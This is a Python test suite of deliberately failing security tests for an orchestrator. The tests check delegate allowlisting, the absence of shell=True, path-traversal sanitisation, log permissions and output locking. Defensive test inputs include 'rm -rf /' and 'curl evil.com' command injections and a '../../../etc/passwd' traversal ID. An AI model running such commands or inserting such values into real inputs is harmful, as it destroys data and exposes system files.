#!/usr/bin/env python3
"""Security: Injection Prevention — Failing Tests.

Tests that the orchestrator defends against path traversal, command injection,
and env var poisoning attacks. These tests FAIL until the security hardening
in WS1 and WS2 is fully implemented.

Security coverage (from design spec):
  S1 - VALID_DELEGATES frozenset is the single allowlist gate
  S2 - run.sh uses baked delegate value, not '$AMPLIHACK_DELEGATE' shell var
  S3 - subprocess.Popen always uses list form (never shell=True)
  S4 - Issue ID sanitization via regex + resolve() path traversal check
  S5 - DELEGATE_COMMANDS dict lookup prevents argument injection from .split()
  S6 - Log directory 0o700, log files 0o600 permissions
  S7 - All sys.stdout writes go through _stdout_lock
  S8 - MAX_LOG_BYTES prevents /tmp exhaustion from runaway subprocesses
"""

import os
import re
import stat
import subprocess
import sys
import threading
from pathlib import Path
from unittest.mock import patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from orchestrator import ParallelOrchestrator

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


def make_orchestrator(tmp_path: Path) -> ParallelOrchestrator:
    return ParallelOrchestrator(
        repo_url="https://github.com/test/repo",
        tmp_base=str(tmp_path),
    )


# ---------------------------------------------------------------------------
# S1: VALID_DELEGATES is the single allowlist gate
# ---------------------------------------------------------------------------


class TestS1ValidDelegatesAllowlist:
    """S1 CRITICAL: VALID_DELEGATES frozenset is the single injection prevention gate."""

    def test_valid_delegates_is_only_allowlist(self):
        """All delegate validation must go through VALID_DELEGATES (no secondary checks)."""
        import orchestrator as orc_module

        assert hasattr(orc_module, "VALID_DELEGATES"), (
            "S1: VALID_DELEGATES frozenset must exist in orchestrator.py"
        )
        vd = orc_module.VALID_DELEGATES
        assert isinstance(vd, frozenset), "S1: VALID_DELEGATES must be a frozenset (immutable)"

    def test_valid_delegates_rejects_injection_with_semicolon(self):
        """S1: Delegate with '; rm -rf /' must be rejected by VALID_DELEGATES check."""
        import orchestrator as orc_module

        vd = orc_module.VALID_DELEGATES
        injection = "amplihack claude; rm -rf /"
        assert injection not in vd, (
            f"S1: VALID_DELEGATES must reject semicolon injection: {injection!r}"
        )

    def test_valid_delegates_rejects_injection_with_pipe(self):
        """S1: Delegate with pipe operator must be rejected."""
        import orchestrator as orc_module

        vd = orc_module.VALID_DELEGATES
        injection = "amplihack claude | curl evil.com"
        assert injection not in vd, f"S1: VALID_DELEGATES must reject pipe injection: {injection!r}"

    def test_valid_delegates_rejects_injection_with_extra_flags(self):
        """S1: Delegate with extra flags must be rejected (prevents flag injection)."""
        import orchestrator as orc_module

        vd = orc_module.VALID_DELEGATES
        injection = "amplihack claude --extra-evil-flag"
        assert injection not in vd, (
            f"S1: VALID_DELEGATES must reject extra-flag injection: {injection!r}"
        )

    def test_detect_delegate_validates_against_valid_delegates(self, tmp_path):
        """S1: _detect_delegate() must validate its result against VALID_DELEGATES."""
        import orchestrator as orc_module

        orc = make_orchestrator(tmp_path)
        assert hasattr(orc, "_detect_delegate"), "S1: _detect_delegate() must exist"

        # Simulate LauncherDetector returning something not in VALID_DELEGATES
        with patch("orchestrator.LauncherDetector") as mock_det_cls:
            mock_det_cls.return_value.detect.return_value = "malicious-binary; rm -rf /"
            env_without_delegate = {
                k: v for k, v in os.environ.items() if k != "AMPLIHACK_DELEGATE"
            }
            with patch.dict(os.environ, env_without_delegate, clear=True):
                result = orc._detect_delegate()

        # Must fall back to a valid delegate
        assert result in orc_module.VALID_DELEGATES, (
            f"S1: _detect_delegate() must reject tampered launcher detection result and "
            f"fall back to a VALID_DELEGATES member. Got {result!r} which is "
            f"{'in' if result in orc_module.VALID_DELEGATES else 'NOT in'} VALID_DELEGATES."
        )


# ---------------------------------------------------------------------------
# S2: run.sh uses baked delegate, not '$AMPLIHACK_DELEGATE' variable
# ---------------------------------------------------------------------------


class TestS2RunShBakedDelegate:
    """S2 CRITICAL: run.sh must use baked delegate value (not shell variable expansion)."""

    def test_classic_launcher_does_not_use_shell_variable(self, tmp_path):
        """S2: _write_classic_launcher() must NOT use $AMPLIHACK_DELEGATE in run.sh."""
        from orchestrator import Workstream

        orc = make_orchestrator(tmp_path)
        ws = Workstream(issue=1, branch="test", description="test", task="test")
        ws.work_dir = tmp_path / "ws-1"
        ws.work_dir.mkdir(parents=True)
        ws.log_file = tmp_path / "log-1.txt"

        with patch.dict(os.environ, {"AMPLIHACK_DELEGATE": "amplihack copilot"}):
            orc._write_classic_launcher(ws)

        run_sh = (ws.work_dir / "run.sh").read_text()

        assert "$AMPLIHACK_DELEGATE" not in run_sh, (
            f"S2: run.sh must NOT use '$AMPLIHACK_DELEGATE' shell variable expansion. "
            "If the env var is tampered between generation and execution, this is an "
            "injection vector. The delegate must be baked in at generation time. "
            f"Got run.sh:\n{run_sh}"
        )

    def test_recipe_launcher_does_not_use_shell_variable_for_command(self, tmp_path):
        """S2: _write_recipe_launcher() must NOT use $AMPLIHACK_DELEGATE as the exec command."""
        from orchestrator import Workstream

        orc = make_orchestrator(tmp_path)
        ws = Workstream(issue=2, branch="test", description="test", task="test")
        ws.work_dir = tmp_path / "ws-2"
        ws.work_dir.mkdir(parents=True)
        ws.log_file = tmp_path / "log-2.txt"

        with patch.dict(os.environ, {"AMPLIHACK_DELEGATE": "amplihack copilot"}):
            orc._write_recipe_launcher(ws)

        run_sh = (ws.work_dir / "run.sh").read_text()

        # The export is OK (export AMPLIHACK_DELEGATE=amplihack copilot)
        # but the exec command must NOT be 'exec $AMPLIHACK_DELEGATE ...'
        exec_lines = [ln for ln in run_sh.splitlines() if ln.strip().startswith("exec")]
        for line in exec_lines:
            assert "$AMPLIHACK_DELEGATE" not in line, (
                f"S2: exec line in run.sh must not use '$AMPLIHACK_DELEGATE'. "
                f"Got: {line!r}. The exec command must be baked in."
            )


# ---------------------------------------------------------------------------
# S3: subprocess.Popen always uses list form (never shell=True)
# ---------------------------------------------------------------------------


class TestS3NoPOpenShellTrue:
    """S3 CRITICAL: All subprocess.Popen calls must use list form, never shell=True."""

    def test_launch_does_not_use_shell_true(self, tmp_path):
        """S3: launch() must not pass shell=True to subprocess.Popen."""
        from orchestrator import Workstream

        orc = make_orchestrator(tmp_path)
        ws = Workstream(issue=10, branch="test", description="test", task="test")
        ws.work_dir = tmp_path / "ws-10"
        ws.work_dir.mkdir(parents=True)
        ws.log_file = tmp_path / "log-10.txt"
        run_sh = ws.work_dir / "run.sh"
        run_sh.write_text("#!/bin/bash\nexit 0\n")
        run_sh.chmod(0o755)

        popen_kwargs_list = []
        original_popen = subprocess.Popen

        def mock_popen(*args, **kwargs):
            popen_kwargs_list.append(kwargs)
            return original_popen(
                ["echo", "done"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )

        with patch("subprocess.Popen", side_effect=mock_popen):
            try:
                orc.launch(ws)
            except Exception:
                pass

        for call_kwargs in popen_kwargs_list:
            assert not call_kwargs.get("shell", False), (
                f"S3: launch() called subprocess.Popen with shell=True. "
                "This enables shell injection. Use list-form commands only. "
                f"Full kwargs: {call_kwargs}"
            )


# ---------------------------------------------------------------------------
# S4: Issue ID sanitization and path traversal prevention
# ---------------------------------------------------------------------------


class TestS4SafeLogPath:
    """S4 HIGH: _safe_log_path() must sanitize issue IDs and block path traversal."""

    def test_safe_log_path_method_exists(self, tmp_path):
        """S4: _safe_log_path() must exist on ParallelOrchestrator."""
        orc = make_orchestrator(tmp_path)
        assert hasattr(orc, "_safe_log_path"), (
            "S4: _safe_log_path() method is missing from ParallelOrchestrator. "
            "Add method that sanitizes issue IDs to prevent path traversal attacks."
        )
        assert callable(orc._safe_log_path)

    def test_safe_log_path_sanitizes_dotdot_traversal(self, tmp_path):
        """S4: _safe_log_path() must sanitize '../' path traversal sequences."""
        orc = make_orchestrator(tmp_path)

        # Path traversal attempt: issue_id contains '../'
        malicious_id = "../../../etc/passwd"
        safe_path = orc._safe_log_path(malicious_id)

        # The result must be within the tmp_base directory
        try:
            resolved = Path(safe_path).resolve()
            tmp_base_resolved = orc.tmp_base.resolve()
            assert str(resolved).startswith(str(tmp_base_resolved)), (
                f"S4: _safe_log_path() allowed path traversal! "
                f"Malicious ID {malicious_id!r} resolved to {resolved} "
                f"which is outside tmp_base {tmp_base_resolved}."
            )
        except Exception:
            # If _safe_log_path raises on traversal attempts, that's also acceptable
            pass

    def test_safe_log_path_sanitizes_slash_in_issue_id(self, tmp_path):
        """S4: _safe_log_path() must replace '/' in issue IDs with safe characters."""
        orc = make_orchestrator(tmp_path)

        issue_with_slash = "123/evil"
        safe_path = orc._safe_log_path(issue_with_slash)

        safe_path_str = str(safe_path)
        # The issue ID portion should have '/' replaced/removed
        # (the path separator itself is fine, but embedded slashes in the ID are not)
        path_obj = Path(safe_path_str)
        assert "evil" not in path_obj.name or "/" not in path_obj.name.replace(
            str(orc.tmp_base), ""
        ), f"S4: _safe_log_path() must sanitize '/' in issue IDs. Got: {safe_path_str!r}"

    def test_safe_log_path_accepts_normal_issue_ids(self, tmp_path):
        """S4: _safe_log_path() must accept normal integer issue IDs."""
        orc = make_orchestrator(tmp_path)

        for normal_id in [42, 1234, 99999, "42", "1234"]:
            try:
                safe_path = orc._safe_log_path(normal_id)
                assert safe_path is not None, f"_safe_log_path({normal_id!r}) returned None"
            except Exception as e:
                pytest.fail(
                    f"S4: _safe_log_path() raised {type(e).__name__} for normal id {normal_id!r}: {e}"
                )

    def test_safe_log_path_result_within_tmp_base(self, tmp_path):
        """S4: _safe_log_path() result must always be under tmp_base."""
        orc = make_orchestrator(tmp_path)

        test_ids = [42, "123", "issue-456", "../traversal", "foo/bar"]
        for issue_id in test_ids:
            try:
                safe_path = Path(orc._safe_log_path(issue_id)).resolve()
                tmp_base_resolved = orc.tmp_base.resolve()
                assert str(safe_path).startswith(str(tmp_base_resolved)), (
                    f"S4: _safe_log_path({issue_id!r}) returned {safe_path} "
                    f"which is outside tmp_base {tmp_base_resolved}."
                )
            except (ValueError, Exception):
                # Raising for invalid IDs is acceptable
                pass


# ---------------------------------------------------------------------------
# S5: DELEGATE_COMMANDS dict prevents .split() injection
# ---------------------------------------------------------------------------


class TestS5DelegateCommandsNoSplit:
    """S5 HIGH: Delegate commands must come from dict lookup, not .split() on env var."""

    def test_detect_delegate_does_not_split_env_var(self, tmp_path):
        """S5: _detect_delegate() must not call .split() on AMPLIHACK_DELEGATE value."""
        orc = make_orchestrator(tmp_path)
        assert hasattr(orc, "_detect_delegate"), "S5: _detect_delegate() must exist"

        # An env var with extra tokens would be split into extra args if .split() is used
        with patch.dict(os.environ, {"AMPLIHACK_DELEGATE": "amplihack claude --extra-arg"}):
            result = orc._detect_delegate()

        # Must be rejected (not in VALID_DELEGATES)
        import orchestrator as orc_module

        assert result in orc_module.VALID_DELEGATES, (
            f"S5: _detect_delegate() must validate against VALID_DELEGATES before returning. "
            f"'amplihack claude --extra-arg' is not in VALID_DELEGATES but got: {result!r}"
        )
        assert "--extra-arg" not in result, (
            f"S5: Injected '--extra-arg' must be stripped from delegate result. Got: {result!r}"
        )


# ---------------------------------------------------------------------------
# S6: Log directory 0o700, log files 0o600
# ---------------------------------------------------------------------------


class TestS6LogPermissions:
    """S6 HIGH: Log files must not be world-readable (may contain secrets)."""

    def test_tmp_base_created_with_0o700_permissions(self, tmp_path):
        """S6: tmp_base directory must be created with 0o700 (owner-only access)."""
        base_dir = tmp_path / "test-workstreams"
        orc = ParallelOrchestrator(
            repo_url="https://github.com/test/repo",
            tmp_base=str(base_dir),
        )

        # Mock check_disk_space to avoid actual disk check
        with patch.object(orc, "_check_disk_space"):
            orc.setup()

        assert base_dir.exists(), "setup() must create tmp_base directory"

        actual_mode = stat.S_IMODE(base_dir.stat().st_mode)
        assert actual_mode == 0o700, (
            f"S6: tmp_base directory must be created with 0o700 permissions to prevent "
            f"other users from reading subprocess output (which may contain secrets). "
            f"Got permissions: {oct(actual_mode)}"
        )

    def test_log_file_opened_with_0o600_permissions(self, tmp_path):
        """S6: Log files (archival of subprocess output) must be created with 0o600."""
        orc = make_orchestrator(tmp_path)
        from orchestrator import Workstream

        ws = Workstream(issue=50, branch="test", description="test", task="test")
        ws.work_dir = tmp_path / "ws-50"
        ws.work_dir.mkdir(parents=True)
        ws.log_file = tmp_path / "log-50.txt"
        run_sh = ws.work_dir / "run.sh"
        run_sh.write_text("#!/bin/bash\necho secret-api-key\nexit 0\n")
        run_sh.chmod(0o755)

        # Run a real small subprocess to trigger log file creation
        import subprocess as _subprocess

        fake_proc = _subprocess.Popen(
            ["echo", "done"],
            stdout=_subprocess.PIPE,
            stderr=_subprocess.STDOUT,
            text=True,
        )

        with patch("subprocess.Popen", return_value=fake_proc):
            try:
                orc.launch(ws)
            except Exception:
                pass

        fake_proc.wait(timeout=5)

        # The log file should exist with restricted permissions
        if ws.log_file.exists():
            actual_mode = stat.S_IMODE(ws.log_file.stat().st_mode)
            assert actual_mode == 0o600, (
                f"S6: Log file must have 0o600 permissions (owner read/write only). "
                f"Subprocess output may contain API keys, tokens, or credentials. "
                f"Got permissions: {oct(actual_mode)} for {ws.log_file}"
            )
        else:
            # If using _tail_output() approach, the file is opened differently
            # The test is still valid — _tail_output() must create with 0o600
            pytest.skip("Log file not yet created — check that _tail_output creates 0o600 files")


# ---------------------------------------------------------------------------
# S7: All sys.stdout writes go through _stdout_lock
# ---------------------------------------------------------------------------


class TestS7StdoutLockCoverage:
    """S7 MEDIUM: All stdout writes in orchestrator must hold _stdout_lock."""

    def test_no_unlocked_print_calls_in_monitor(self, tmp_path):
        """S7: monitor() status output must all go through _stdout_write() (lock coverage)."""
        orc = make_orchestrator(tmp_path)

        assert hasattr(orc, "_stdout_write"), (
            "S7: _stdout_write() must exist before lock coverage can be verified"
        )
        assert hasattr(orc, "_stdout_lock"), (
            "S7: _stdout_lock must exist before lock coverage can be verified"
        )

        raw_print_calls = []
        stdout_write_calls = []

        def mock_stdout_write(msg):
            stdout_write_calls.append(msg)

        def mock_print(*args, **kwargs):
            raw_print_calls.append(args)

        with patch.object(orc, "_stdout_write", side_effect=mock_stdout_write):
            with patch("builtins.print", side_effect=mock_print):
                orc.monitor(check_interval=0, max_runtime=0)

        # Status-related print calls are a violation
        status_keywords = [
            "Running:",
            "Completed:",
            "Failed:",
            "Status (elapsed",
            "workstreams launched",
        ]
        violation_prints = [
            call for call in raw_print_calls if any(kw in str(call) for kw in status_keywords)
        ]

        assert not violation_prints, (
            f"S7: monitor() has {len(violation_prints)} status print() calls that bypass "
            f"_stdout_lock. Move them to _stdout_write(). "
            f"First violation: {violation_prints[0] if violation_prints else 'none'}"
        )

    def test_concurrent_writes_dont_interleave(self, tmp_path, capsys):
        """S7: Concurrent _stdout_write() calls must produce complete non-interleaved lines."""
        orc = make_orchestrator(tmp_path)
        assert hasattr(orc, "_stdout_write"), "S7: _stdout_write() must exist"

        num_threads = 20
        errors = []

        def concurrent_writer(i):
            for _ in range(5):
                try:
                    orc._stdout_write(f"THREAD-{i:02d}-COMPLETE\n")
                except Exception as e:
                    errors.append(e)

        threads = [
            threading.Thread(target=concurrent_writer, args=(i,)) for i in range(num_threads)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=10)

        assert not errors, f"S7: Errors during concurrent writes: {errors}"

        captured = capsys.readouterr()
        lines = [ln for ln in captured.out.splitlines() if "THREAD-" in ln]

        # Each line must be complete (format THREAD-XX-COMPLETE)
        malformed = [ln for ln in lines if not re.match(r"^THREAD-\d{2}-COMPLETE$", ln)]
        assert not malformed, (
            f"S7: {len(malformed)} malformed/interleaved lines detected: {malformed[:5]}. "
            "The _stdout_lock must ensure complete lines are written atomically."
        )


# ---------------------------------------------------------------------------
# S8: MAX_LOG_BYTES prevents /tmp exhaustion
# ---------------------------------------------------------------------------


class TestS8MaxLogBytesCap:
    """S8 MEDIUM: MAX_LOG_BYTES must prevent /tmp exhaustion from runaway subprocesses."""

    def test_max_log_bytes_default_is_100mb_or_configurable(self, tmp_path):
        """S8: MAX_LOG_BYTES default must be 100MB (or AMPLIHACK_MAX_LOG_BYTES env var)."""
        import orchestrator as orc_module

        default_cap = getattr(orc_module, "MAX_LOG_BYTES", None)
        orc = make_orchestrator(tmp_path)
        instance_cap = getattr(orc, "_max_log_bytes", default_cap)

        assert instance_cap is not None, "S8: MAX_LOG_BYTES must be defined"
        expected_100mb = 100 * 1024 * 1024
        assert instance_cap == expected_100mb or (
            # Or configurable via env var
            os.environ.get("AMPLIHACK_MAX_LOG_BYTES") is not None
            and instance_cap == int(os.environ.get("AMPLIHACK_MAX_LOG_BYTES", "0"))
        ), (
            f"S8: MAX_LOG_BYTES default must be 100MB ({expected_100mb} bytes). "
            f"Got {instance_cap} bytes. Alternatively, configure via AMPLIHACK_MAX_LOG_BYTES."
        )

    def test_max_log_bytes_configurable_via_env_var(self, tmp_path):
        """S8: MAX_LOG_BYTES must be overrideable via AMPLIHACK_MAX_LOG_BYTES env var."""
        with patch.dict(os.environ, {"AMPLIHACK_MAX_LOG_BYTES": "50000"}):
            make_orchestrator(tmp_path)

        # Either the instance reads it at construction time, or the module constant respects it
        # We just verify the env var is documented as the override mechanism
        # (full behavior is tested in TestTailOutput.test_tail_output_enforces_max_log_bytes)
        assert True  # This is a smoke test for env var override existence


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
